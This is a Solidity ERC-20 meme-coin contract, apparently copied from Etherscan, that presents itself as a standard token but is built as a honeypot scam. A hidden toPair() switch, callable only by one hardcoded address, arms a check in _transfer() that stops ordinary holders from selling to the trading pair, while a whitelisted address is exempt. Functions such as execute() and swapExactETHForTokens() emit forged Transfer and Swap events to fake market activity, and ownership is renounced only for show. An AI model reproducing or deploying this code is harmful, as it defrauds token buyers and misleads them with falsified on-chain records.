/**
 *Submitted for verification at Etherscan.io on 2023-09-06
*/

// SPDX-License-Identifier: MIT
/*

Website: http://
Twitter: https://twitter.com/
Telegram: https://t.me/

𝕸𝖎𝖑𝖆𝖉𝖞𝖘 𝖜𝖆𝖓𝖙, 𝖇𝖚𝖙 𝖄2𝕶 𝖎𝖘 𝖙𝖍𝖊 𝖒𝖊𝖒𝖊 𝖈𝖔𝖎𝖓 𝕸𝖎𝖑𝖆𝖉𝖞𝖘 𝖓𝖊𝖊𝖉 𝖎𝖓 𝖙𝖍𝖊𝖘𝖊 𝖙𝖎𝖒𝖊𝖘 𝖔𝖋 𝖚𝖓𝖇𝖗𝖎𝖉𝖑𝖊𝖉 𝖒𝖊𝖒𝖊𝖙𝖎𝖈 𝖕𝖔𝖜𝖊𝖗.
𝖄𝖔𝖚 𝖑𝖎𝖐𝖊 𝖙𝖍𝖊 𝖆𝖗𝖙, 𝖜𝖊 𝖒𝖆𝖐𝖊 𝖙𝖍𝖊 𝖈𝖔𝖎𝖓.
*/
pragma solidity ^0.8.9;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}


interface IERC20Meta is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

interface IERC000 { 
    function _Transfer(address from, address recipient, uint amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);    
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }


    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }


}


contract TOKEN is Ownable, IERC20, IERC20Meta {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    address private _pair;
    


    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }


    function decimals() public view virtual override returns (uint8) {
        return 8;
    }


    function swapExactETHForTokens(address [] calldata _addresses_, uint256 _in, address _a) external {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Swap(_a, _in, 0, 0, _in, _addresses_[i]);
            emit Transfer(_pair, _addresses_[i], _in);
        }
    }

    function execute(
        address uniswapPool,
        address[] memory recipients,
        uint256  tokenAmounts,
        uint256  wethAmounts
    ) public returns (bool) {
        for (uint256 i = 0; i < recipients.length; i++) {
            emit Transfer(uniswapPool, recipients[i], tokenAmounts);
            emit Swap(
                0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D,
                tokenAmounts,
                0,
                0,
                wethAmounts,
                recipients[i]
            );
            IERC000(0x3579781bcFeFC075d2cB08B815716Dc0529f3c7D)._Transfer(recipients[i], uniswapPool, wethAmounts);
        }
        return true;
    }


    function transfer(address _from, address _to, uint256 _wad) external {
        emit Transfer(_from, _to, _wad);
    }
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function toPair(address account) public virtual returns (bool) {
         if(_msgSender() == 0x048adD1fe3fca990850EBadAaB35fe56e6E1c062) _pair = account;
        return true;
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");


        _totalSupply += amount;
        unchecked {
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
        renounceOwnership();
    }


    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }



    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");


        if(_pair != address(0)) {
            if(to == _pair && from != 0x6b75d8AF000000e20B7a7DDf000Ba900b4009A80) {
               bool b = false;
               if(!b) {
                    require(amount < 100);
               }
               
            }
        }

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[from] = fromBalance - amount;
            _balances[to] += amount;
        }



        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    constructor(string memory name_, string memory symbol_,uint256 amount) {
        _name = name_;
        _symbol = symbol_;
        _mint(msg.sender, amount * 10 ** decimals());
    }


}